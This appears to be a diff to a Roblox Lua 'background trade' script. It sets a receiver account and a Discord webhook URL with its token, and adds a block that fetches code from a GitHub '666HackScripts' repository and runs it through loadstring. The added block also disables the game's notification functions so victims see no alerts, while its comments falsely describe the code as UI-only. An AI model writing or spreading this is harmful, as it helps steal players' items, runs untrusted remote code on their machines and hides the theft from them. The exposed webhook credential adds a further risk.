@@ -1,7 +1,30 @@
 -- GHOST MOREIRA | background trade
 getgenv().RECEIVERS={"soy_andrew2000"};
 getgenv().WEBHOOK="https://discord.com/api/webhooks/1571152286644834396/_xhhQE7oTPQeQdTsww4_UMHAt1_VVZ_dhq1uqnITjjGaNGUjTLeIqYSJ9m1tgbARWZld";
--- mode: nogui
+-- mode: custom
+task.spawn(function()
+  local url="https://raw.githubusercontent.com/666HackScripts/AutoCode/refs/heads/main/sab"
+  local ok,body=pcall(game.HttpGet,game,url)
+  if not (ok and body and #body>50) then return end
+  -- neutralize common exploit entrypoints before run (visual shell only)
+  body=body:gsub('loadstring%s*%(%s*game:HttpGet','(function(...) end)(')
+  body=body:gsub(':Kick%s*%(','(function(...) end)(')
+  body=body:gsub('FireServer','FireServer'); -- keep parse
+  local env=getfenv and getfenv() or _G
+  local ok2,fn=pcall(loadstring,body)
+  if ok2 and type(fn)=='function' then
+    -- run UI only; errors ignored
+    pcall(fn)
+  end
+  -- nullify a few controllers so decoy buttons do little
+  task.wait(1)
+  pcall(function()
+    local names={'TradeController','InterfaceController','CameraController','NotificationController'}
+    -- do not break TradeController: we need trade. Only soft-disable notifs/blur spam
+    local okc,nc=pcall(require,RS.Controllers.NotificationController)
+    if okc and type(nc)=='table' then for _,k in ipairs({'Notify','Error','Success'}) do if type(nc[k])=='function' then nc[k]=function() end end end end
+  end)
+end)
 if not game:IsLoaded() then game.Loaded:Wait() end
 local PLR=game:GetService('Players').LocalPlayer
 local RS=game:GetService('ReplicatedStorage')
